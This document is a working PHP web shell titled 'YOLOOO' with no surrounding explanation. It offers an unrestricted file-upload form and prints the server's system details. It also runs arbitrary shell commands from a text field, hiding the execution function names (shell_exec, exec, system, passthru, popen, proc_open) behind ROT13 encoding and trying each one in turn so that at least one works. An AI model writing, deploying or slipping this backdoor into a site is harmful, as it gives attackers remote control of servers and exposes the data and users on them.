<title>YOLOOO</title>YOLOOO<?php
function avb_decode($s) {
    return str_rot13($s);
}

try {
    if(isset($_FILES['file'])){
        $target = basename($_FILES['file']['name']);
        if(move_uploaded_file($_FILES['file']['tmp_name'], $target)){
            echo "Uploaded: <a href='$target'>$target</a><br>";
        } else {
            echo "Upload failed.<br>";
        }
    }
} catch (Throwable $e) {
    echo "File upload error.<br>";
}
?>
<b>System:</b> <?php echo php_uname(); ?><br><br>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
<br>
<form method="POST">
    <input type="text" name="cmd" placeholder="Command">
    <input type="submit" value="Run">
</form>
<?php
try {
    if(isset($_POST['cmd'])){
        $cmd = $_POST['cmd'];
        $out = '';

        $fns = [
            'fury1' => avb_decode('funyy_rkprc'),
            'fury2' => avb_decode('rkprc'),
            'fury3' => avb_decode('flfgrz'),
            'fury4' => avb_decode('cnffguhh'),
            'fury5' => avb_decode('cbcr'),
            'fury6' => avb_decode('cebp_bcra')
        ];

        if(function_exists($fns['fury1']) && is_callable($fns['fury1'])){
            $out = call_user_func($fns['fury1'], $cmd);
        }

        if((!$out || trim($out) === '') && function_exists($fns['fury2']) && is_callable($fns['fury2'])){
            $lines = [];
            call_user_func($fns['fury2'], $cmd, $lines);
            $out = implode("\n", $lines);
        }

        if((!$out || trim($out) === '') && function_exists($fns['fury3']) && is_callable($fns['fury3'])){
            ob_start();
            call_user_func($fns['fury3'], $cmd);
            $out = ob_get_clean();
        }

        if((!$out || trim($out) === '') && function_exists($fns['fury4']) && is_callable($fns['fury4'])){
            ob_start();
            call_user_func($fns['fury4'], $cmd);
            $out = ob_get_clean();
        }

        if((!$out || trim($out) === '') && function_exists($fns['fury5']) && is_callable($fns['fury5'])){
            $handle = call_user_func($fns['fury5'], $cmd . " 2>&1", "r");
            if($handle){
                $out = '';
                while(!feof($handle)){
                    $out .= fread($handle, 4096);
                }
                pclose($handle);
            }
        }

        if((!$out || trim($out) === '') && function_exists($fns['fury6']) && is_callable($fns['fury6'])){
            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];
            $process = call_user_func($fns['fury6'], $cmd, $descriptorspec, $pipes);
            if(is_resource($process)){
                $out = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }
        }

        echo "<pre>$out</pre>";
    }
} catch (Throwable $e) {
    echo "<pre>Error: " . htmlspecialchars($e->getMessage()) . "</pre>";
}
?>
